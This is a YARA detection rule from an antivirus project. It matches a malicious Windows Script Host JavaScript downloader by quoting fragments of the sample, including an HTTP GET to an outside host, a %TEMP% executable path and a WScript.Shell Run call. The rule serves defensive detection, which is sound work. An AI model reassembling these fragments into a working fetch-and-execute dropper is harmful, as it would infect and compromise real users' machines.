rule sig_20160328_171d3f6f8444ba15093f3c312360d4c9 {
  meta:
    description = "datamaliciousorder - file 20160328_171d3f6f8444ba15093f3c312360d4c9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "117ea788339c86d0771bb5eb3414f7165e521fedb9230dcfe1b6cf00d2f350a9"

  strings:
    $s1  = "function Ngsqzdcuq() {return Vsyslo[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"9Oc18BYbUZCNWP.exe\";};" fullword ascii
    $s2  = "Xfnnym[Rchmz](\"GET\", \"http://zapableapp.com/l1sape\", false);" fullword ascii
    $s3  = "do {WScript[Pfaneznuw](Soqslfapcl() * 11)} while (Xfnnym[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Vsyslo = function Lccrzzb() {return WScript[Owjmsmsjtl](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Vqngltdzkg(Azjdymy, Jxspcfpl){return Azjdymy - Jxspcfpl;};" fullword ascii
    $s6  = "function Ugheig() {return ((Nroljeve == true) && (Nroljeve == Yhbbelgnm)) ? 1 : Vsbuuzdfi;};" fullword ascii
    $s7  = "function Vartj(Xyoni){Vsyslo[\"Run\"](Xyoni, Vsbuuzdfi, Vsbuuzdfi);};" fullword ascii
    $s8  = "function Soqslfapcl(){return 22;};" fullword ascii
    $s9  = "function Eivwoi()" fullword ascii
    $s10 = "function Xqmoeygbun(){return Owjmsmsjtl;};" fullword ascii
    $s11 = "Nroljeve = true; " fullword ascii
    $s12 = "return Vqngltdzkg(Fcwszac, Opbhyqx);" fullword ascii
    $s13 = "var Tmeymxpj = new this[\"Date\"]();" fullword ascii
    $s14 = "var Nroljeve = false;" fullword ascii
    $s15 = "Yhbbelgnm = true; " fullword ascii
    $s16 = "function Ajghsyvtu(Vambic) {var Pxinbefuts = (1, 2, 3, 4, 5, Vambic); return Pxinbefuts;};" fullword ascii
    $s17 = "var Uukknxndj = false;" fullword ascii
    $s18 = "function Jephcystq(){return Neotkf;};" fullword ascii
    $s19 = " while (Ulrqvn){" fullword ascii
    $s20 = "var Yhbbelgnm = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}